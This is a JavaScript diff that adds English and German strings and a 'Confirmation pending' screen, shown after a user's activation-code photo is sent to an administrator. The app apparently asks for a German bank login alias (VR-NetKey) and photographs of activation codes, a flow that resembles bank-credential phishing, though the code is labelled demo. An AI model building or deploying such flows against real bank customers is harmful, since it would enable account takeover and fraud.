@@ -497,6 +497,9 @@ const translations = {
     demoPhotoReady: "Photo ready to send.",
     demoPhotoSent: "Photo sent to admin.",
     chooseDemoImage: "Choose image",
+    confirmationPending: "Confirmation pending",
+    confirmationPendingHint: "Your photo has been sent to the administrator. You will receive an update once it has been reviewed.",
+    ok: "OK",
     enterVrMessage: "Enter your VR-NetKey/Alias and message to submit the request.",
     chooseRecipient: "Choose recipient",
     chooseAccountToUse: "Choose account to use",
@@ -811,6 +814,9 @@ const translations = {
     demoPhotoReady: "Foto bereit zum Senden.",
     demoPhotoSent: "Foto an Admin gesendet.",
     chooseDemoImage: "Bild ausw\u00e4hlen",
+    confirmationPending: "Best\u00e4tigung ausstehend",
+    confirmationPendingHint: "Ihr Foto wurde an den Administrator gesendet. Sie erhalten eine Aktualisierung, sobald es gepr\u00fcft wurde.",
+    ok: "OK",
     enterVrMessage: "Geben Sie VR-NetKey/Alias und Nachricht ein, um die Anfrage zu senden.",
     chooseRecipient: "Empf\u00e4nger ausw\u00e4hlen",
     chooseAccountToUse: "Konto ausw\u00e4hlen",
@@ -2156,7 +2162,11 @@ function restoreSavedPage() {
   const page = document.querySelector(`#${CSS.escape(savedPage)}Page`);
   const pageName = page ? savedPage : "overview";
   if (pageName === "activationCode") {
-    renderActivationCodePage(state.ui?.activationCodeScreen || "home");
+    if (state.ui?.activationCodeScreen === "pending") {
+      renderActivationPendingScreen();
+    } else {
+      renderActivationCodePage(state.ui?.activationCodeScreen || "home");
+    }
   }
   switchPage(pageName, { persist: false });
 }
@@ -3883,6 +3893,14 @@ activationCodeRoot?.addEventListener("click", (event) => {
     submitActivationDemoPhoto();
     return;
   }
+  if (event.target.closest("#activationPendingOkButton")) {
+    state.ui ||= {};
+    state.ui.activePage = "overview";
+    state.ui.activationCodeScreen = "home";
+    saveState();
+    switchPage("overview");
+    return;
+  }
   if (event.target.closest("#activationBackButton")) {
     if (activationCodeRoot.querySelector(".activation-scan-page")) {
       renderActivationCodePage("home");
@@ -4639,6 +4657,26 @@ function setActivationCameraStatus(message, type = "") {
   status.className = type ? `activation-camera-status ${type}` : "activation-camera-status";
 }
 
+function renderActivationPendingScreen() {
+  if (!activationCodeRoot) {
+    return;
+  }
+  stopActivationCamera();
+  activationCapturedPhoto = "";
+  state.ui ||= {};
+  state.ui.activePage = "activationCode";
+  state.ui.activationCodeScreen = "pending";
+  saveState();
+  activationCodeRoot.innerHTML = `
+    <div class="activation-page activation-pending-page">
+      <div class="activation-pending-mark" aria-hidden="true"></div>
+      <h3>${escapeHtml(t("confirmationPending"))}</h3>
+      <p>${escapeHtml(t("confirmationPendingHint"))}</p>
+      <button id="activationPendingOkButton" class="activation-submit-button" type="button">${escapeHtml(t("ok"))}</button>
+    </div>
+  `;
+}
+
 function stopActivationCamera() {
   if (!activationCameraStream) {
     return;
@@ -4758,7 +4796,7 @@ async function submitActivationDemoPhoto() {
   saveState();
   await sendAuditEvent("demo-verification-request", { request });
   renderAdminDemoVerificationRequests();
-  setActivationCameraStatus(t("demoPhotoSent"), "success");
+  renderActivationPendingScreen();
 }
 
 function VerificationFlow({ amount, type, payload = {}, onCancelPage = "savings", onCancelStage = "" }) {
